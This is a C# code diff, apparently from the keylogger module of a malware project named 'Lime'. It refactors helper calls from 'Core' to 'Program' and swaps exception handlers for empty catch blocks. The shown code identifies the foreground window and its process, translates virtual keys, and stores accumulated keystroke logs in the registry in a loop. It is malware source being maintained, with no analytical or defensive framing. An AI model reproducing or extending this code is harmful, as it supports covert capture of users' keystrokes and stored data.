@@ -54,7 +54,7 @@ namespace Lime
         {
             try
             {
-                IntPtr foregroundWindow = Core.GetForegroundWindow();
+                IntPtr foregroundWindow = Program.GetForegroundWindow();
                 int processId = 0;
                 GetWindowThreadProcessId(foregroundWindow, ref processId);
                 Process processById = Process.GetProcessById(processId);
@@ -73,11 +73,7 @@ namespace Lime
                     });
                 }
             }
-            catch (Exception expr_C2)
-            {
-                ProjectData.SetProjectError(expr_C2);
-                ProjectData.ClearProjectError();
-            }
+            catch { }
             return "";
         }
 
@@ -94,7 +90,7 @@ namespace Lime
                     return result;
                 }
                 uint b = MapVirtualKey(a, 0u);
-                IntPtr foregroundWindow = Core.GetForegroundWindow();
+                IntPtr foregroundWindow = Program.GetForegroundWindow();
                 IntPtr arg_3B_0 = foregroundWindow;
                 int num = 0;
                 int windowThreadProcessId = GetWindowThreadProcessId(arg_3B_0, ref num);
@@ -103,11 +99,7 @@ namespace Lime
                 result = stringBuilder.ToString();
                 return result;
             }
-            catch (Exception expr_68)
-            {
-                ProjectData.SetProjectError(expr_68);
-                ProjectData.ClearProjectError();
-            }
+            catch { }
             return (checked((Keys)a)).ToString();
         }
 
@@ -186,7 +178,7 @@ namespace Lime
 
         public void WRK()
         {
-            this.Logs = Conversions.ToString(Core.GetValueFromRegistry(this.vn, ""));
+            this.Logs = Conversions.ToString(Program.GetValueFromRegistry(this.vn, ""));
             checked
             {
                 try
@@ -220,16 +212,12 @@ namespace Lime
                             {
                                 this.Logs = this.Logs.Remove(0, this.Logs.Length - num3);
                             }
-                            Core.SaveValueOnRegistry(this.vn, this.Logs, RegistryValueKind.String);
+                            Program.SaveValueOnRegistry(this.vn, this.Logs, RegistryValueKind.String);
                         }
                         Thread.Sleep(1);
                     }
                 }
-                catch (Exception expr_FD)
-                {
-                    ProjectData.SetProjectError(expr_FD);
-                    ProjectData.ClearProjectError();
-                }
+                catch { }
             }
         }
 
